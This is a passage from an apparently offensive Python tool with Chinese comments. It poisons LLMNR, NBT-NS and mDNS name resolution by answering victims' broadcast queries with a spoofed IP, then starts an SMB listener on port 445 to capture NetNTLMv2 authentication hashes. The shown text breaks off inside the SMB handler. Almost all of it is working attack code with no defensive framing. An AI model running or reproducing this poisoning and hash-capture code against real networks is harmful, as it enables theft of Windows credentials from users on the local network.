            sock.settimeout(1.0)
        except Exception as e:
            with lock:
                results.append(f"  [WARN] LLMNR 绑定 5355 失败: {e}")
            return

        try:
            # 加入 LLMNR 多播组 224.0.0.252
            mreq = struct.pack('4s4s', socket.inet_aton('224.0.0.252'), socket.inet_aton('0.0.0.0'))
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
        except Exception:
            pass

        while not stop_flag.is_set():
            try:
                data, addr = sock.recvfrom(4096)
            except socket.timeout:
                continue
            except Exception:
                break
            if len(data) < 12:
                continue
            try:
                # 解析 LLMNR 查询名
                tid = data[:2]
                qname = parse_dns_name(data[12:])
                if not qname:
                    continue
                with lock:
                    captured.append(('LLMNR', qname, addr[0], datetime.now().strftime('%H:%M:%S')))
                    results.append(f"  [LLMNR] {addr[0]} 查询: {qname}")
                # 构造响应: 告诉它 qname 的 A 记录是 spoof_ip
                resp = build_llmnr_response(tid, qname, spoof_ip, addr[0])
                sock.sendto(resp, addr)
            except Exception:
                continue
        sock.close()

    def parse_dns_name(payload):
        """解析 DNS/LLMNR 格式的查询名"""
        try:
            parts = []
            i = 0
            while i < len(payload):
                ln = payload[i]
                if ln == 0:
                    break
                i += 1
                parts.append(payload[i:i+ln].decode('ascii', 'ignore'))
                i += ln
            return '.'.join(parts) if parts else None
        except Exception:
            return None

    def build_llmnr_response(tid, qname, ip, dst_ip):
        """构造 LLMNR 响应包 (A记录)"""
        try:
            header = tid + b'\x80\x00' + struct.pack('!HHHH', 1, 1, 0, 0)
            qname_bytes = b''
            for part in qname.split('.'):
                qname_bytes += struct.pack('B', len(part)) + part.encode()
            qname_bytes += b'\x00'
            question = qname_bytes + struct.pack('!HH', 1, 1)   # A, IN
            answer = (b'\xc0\x0c' + struct.pack('!HHIH', 1, 1, 30, 4)
                      + socket.inet_aton(ip))
            return header + question + answer
        except Exception:
            return b''

    # ============================================================
    # 2. NBT-NS 投毒 (UDP 137)
    # ============================================================
    def nbtns_poison():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(('0.0.0.0', 137))
            sock.settimeout(1.0)
        except Exception as e:
            with lock:
                results.append(f"  [WARN] NBT-NS 绑定 137 失败: {e}")
            return

        while not stop_flag.is_set():
            try:
                data, addr = sock.recvfrom(4096)
            except socket.timeout:
                continue
            except Exception:
                break
            if len(data) < 12:
                continue
            try:
                # NBT-NS 查询名在 offset 12, 32字节 NetBIOS 名
                nb_name = decode_nbt_name(data[12:12+32])
                if not nb_name:
                    continue
                with lock:
                    captured.append(('NBT-NS', nb_name, addr[0], datetime.now().strftime('%H:%M:%S')))
                    results.append(f"  [NBT-NS] {addr[0]} 查询: {nb_name}")
                # 构造 NBT-NS 正向响应
                resp = build_nbtns_response(data[:2], nb_name, spoof_ip)
                sock.sendto(resp, addr)
            except Exception:
                continue
        sock.close()

    def decode_nbt_name(raw):
        """解码 NetBIOS 名称 (第一层编码)"""
        try:
            if len(raw) < 32:
                return None
            out = []
            for i in range(0, 32, 2):
                hi = raw[i] - 0x41
                lo = raw[i+1] - 0x41
                out.append((hi << 4) | lo)
            name = bytes(out).decode('ascii', 'ignore').strip()
            # 去掉 padding 和类型字节
            name = name.rstrip('\x00').strip()
            if name.endswith('\x20'):
                name = name[:-1]
            return name or None
        except Exception:
            return None

    def build_nbtns_response(tid, name, ip):
        """构造 NBT-NS 正向查询响应"""
        try:
            header = tid + b'\x85\x00' + struct.pack('!HHHH', 0, 1, 0, 0)
            # 编码名称回填 (用原始查询名或简化)
            name_bytes = b''
            for ch in name.upper().ljust(16, ' ')[:16]:
                o = ord(ch)
                name_bytes += struct.pack('BB', 0x41 + (o >> 4), 0x41 + (o & 0x0F))
            name_bytes += b'\x00'
            name_bytes += b'\x00\x20'   # type NB
            name_bytes += b'\x00\x01'   # class IN
            answer = b'\xc0\x0c' + struct.pack('!HHIH', 0x0020, 0x0001, 300, 6)
            answer += b'\x00\x00' + socket.inet_aton(ip) + b'\x00\x00'
            return header + name_bytes + answer
        except Exception:
            return b''

    # ============================================================
    # 3. mDNS 投毒 (UDP 5353) - 简化版
    # ============================================================
    def mdns_poison():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(('0.0.0.0', 5353))
            sock.settimeout(1.0)
        except Exception as e:
            with lock:
                results.append(f"  [WARN] mDNS 绑定 5353 失败: {e}")
            return
        try:
            mreq = struct.pack('4s4s', socket.inet_aton('224.0.0.251'), socket.inet_aton('0.0.0.0'))
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
        except Exception:
            pass

        while not stop_flag.is_set():
            try:
                data, addr = sock.recvfrom(4096)
            except socket.timeout:
                continue
            except Exception:
                break
            if len(data) < 12:
                continue
            try:
                qname = parse_dns_name(data[12:])
                if not qname:
                    continue
                with lock:
                    captured.append(('mDNS', qname, addr[0], datetime.now().strftime('%H:%M:%S')))
                    results.append(f"  [mDNS] {addr[0]} 查询: {qname}")
            except Exception:
                continue
        sock.close()

    # ============================================================
    # 4. SMB 监听抓 NTLM 哈希
    # ============================================================
    def smb_capture():
        """
        在 445 端口监听 SMB 认证, 从 NTLMSSP 消息中提取 NetNTLMv2 响应。
        不实现完整 SMB 协议栈, 只做最小握手以获取 Type3 消息。
        """
        try:
            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind(('0.0.0.0', 445))
            srv.listen(16)
            srv.settimeout(1.0)
        except Exception as e:
            with lock:
                results.append(f"  [WARN] SMB 445 监听失败(可能已被占用/需管理员): {e}")
            return

        while not stop_flag.is_set():
            try:
                conn, addr = srv.accept()
            except socket.timeout:
                continue
            except Exception:
                break
            # 每个连接独立处理
            threading.Thread(target=handle_smb_conn, args=(conn, addr), daemon=True).start()

        srv.close()

    def handle_smb_conn(conn, addr):
        """处理单个 SMB 连接, 发送 NTLM Challenge, 抓取 Type3 响应"""
        try:
            conn.settimeout(10)
            # 1. 接收 SMB Negotiate
            data = conn.recv(4096)
            if not data or len(data) < 8:
                conn.close(); return

            # 2. 发送 SMB Negotiate Response (简化, 声明支持 NTLMSSP)
            neg_resp = bytes.fromhex(
